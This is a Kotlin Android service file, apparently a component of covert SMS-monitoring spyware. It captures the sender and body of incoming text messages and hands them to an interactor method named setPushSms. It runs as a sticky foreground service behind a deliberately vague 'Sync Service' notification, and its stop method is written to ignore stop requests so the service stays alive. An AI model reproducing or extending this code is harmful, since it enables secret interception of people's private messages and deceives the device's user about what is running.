package com.safe.setting.app.services.sms

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.safe.setting.app.R // सुनिश्चित करें कि R.string.app_name और R.mipmap.ic_vv_round मौजूद हैं
import com.safe.setting.app.services.base.BaseService
import com.safe.setting.app.utils.Consts.SMS_ADDRESS
import com.safe.setting.app.utils.Consts.SMS_BODY
import com.safe.setting.app.utils.Consts.TYPE_SMS
import javax.inject.Inject

class SmsService : BaseService(), InterfaceServiceSms {

    @Inject
    lateinit var interactor: InterfaceInteractorSms<InterfaceServiceSms>

    companion object {
        const val TAG = "SmsService"
        const val NOTIFICATION_CHANNEL_ID = "SmsServiceChannel"
        const val NOTIFICATION_ID = 1
    }

    override fun onCreate() {
        super.onCreate()
        if (hasSmsPermission()) {
            getComponent()?.inject(this)
            interactor.onAttach(this)
        } else {
            Log.e(TAG, "SMS permission not granted. Stopping service.")
            stopSelf()
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(NOTIFICATION_ID, createNotification())
        intent?.setSmsIntent()
        return START_STICKY
    }

    private fun createNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID,
                "Sync Service", // उपयोगकर्ता को दिखने वाला नाम
                NotificationManager.IMPORTANCE_LOW // कम प्राथमिकता
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(serviceChannel)
        }

        return NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setContentTitle(getString(R.string.app_name))
            .setContentText("Sync service is running.")
            .setSmallIcon(R.mipmap.c_launcher_foreground)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    private fun Intent.setSmsIntent() {
        getStringExtra(SMS_ADDRESS)?.let { address ->
            getStringExtra(SMS_BODY)?.let { body ->
                val type = getIntExtra(TYPE_SMS, 0)
                interactor.setPushSms(address, body, type)
            }
        }
    }

    override fun stopServiceSms() {
        Log.d(TAG, "stopServiceSms called, but we are keeping the service alive.")
    }

    override fun onDestroy() {
        interactor.onDetach()
        super.onDestroy()
    }

    private fun hasSmsPermission(): Boolean {
        return ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.RECEIVE_SMS
        ) == PackageManager.PERMISSION_GRANTED
    }
}
